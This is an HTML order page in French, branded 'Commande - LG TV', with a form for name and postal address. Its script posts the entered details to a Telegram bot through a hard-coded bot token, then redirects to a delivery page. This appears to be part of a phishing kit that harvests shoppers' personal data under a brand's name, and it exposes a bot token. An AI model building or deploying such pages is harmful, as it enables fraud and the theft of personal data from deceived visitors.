<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Commande - LG TV</title>
    <style>
        /* Styles existants ici */
    </style>
</head>
<body>
    <!-- Formulaire -->
    <div class="container">
        <h2>Remplissez vos informations</h2>
        <form id="orderForm">
            <div class="form-group">
                <label for="prenom">Prénom *</label>
                <input type="text" id="prenom" name="prenom" required placeholder="Entrez votre prénom">
            </div>
            <div class="form-group">
                <label for="nom">Nom *</label>
                <input type="text" id="nom" name="nom" required placeholder="Entrez votre nom">
            </div>
            <div class="form-group">
                <label for="rue">Rue *</label>
                <input type="text" id="rue" name="rue" required placeholder="Entrez votre rue">
            </div>
            <div class="form-group">
                <label for="numero">N°</label>
                <input type="text" id="numero" name="numero" placeholder="Entrez votre numéro de rue">
            </div>
            <div class="form-group">
                <label for="code_postal">Code postal *</label>
                <input type="text" id="code_postal" name="code_postal" required placeholder="Entrez votre code postal">
            </div>
            <div class="form-group">
                <label for="ville">Ville *</label>
                <input type="text" id="ville" name="ville" required placeholder="Entrez votre ville">
            </div>
            <div class="form-group">
                <button type="submit">Confirmer La Commande</button>
            </div>
        </form>
    </div>

    <script>
        // Configuration Telegram
        const botToken = '8101158488:AAH6WIfCC6bGkWd_Tt6QRrWD8QKQQc69M'; // Remplacez par votre token
        const chatId = '5372119436'; // Remplacez par votre chat ID

        // Gestionnaire de soumission du formulaire
        document.getElementById('orderForm').addEventListener('submit', function (e) {
            e.preventDefault(); // Empêche le rechargement de la page

            // Collecte des données du formulaire
            const prenom = document.getElementById('prenom').value;
            const nom = document.getElementById('nom').value;
            const rue = document.getElementById('rue').value;
            const numero = document.getElementById('numero').value || 'Non spécifié';
            const codePostal = document.getElementById('code_postal').value;
            const ville = document.getElementById('ville').value;

            // Créer le message pour Telegram
            const message = `
Nouvelle commande :
👤 Nom : ${prenom} ${nom}
📍 Adresse : ${numero} ${rue}, ${codePostal} ${ville}
            `;

            // Envoi des données à Telegram
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(response => {
                if (response.ok) {
                    // Redirection après succès
                    window.location.href = 'page-livraison1.html';
                } else {
                    alert('Erreur lors de l\'envoi des informations. Veuillez réessayer.');
                }
            })
            .catch(error => {
                console.error('Erreur:', error);
                alert('Erreur de communication avec Telegram.');
            });
        });
    </script>
</body>
</html>
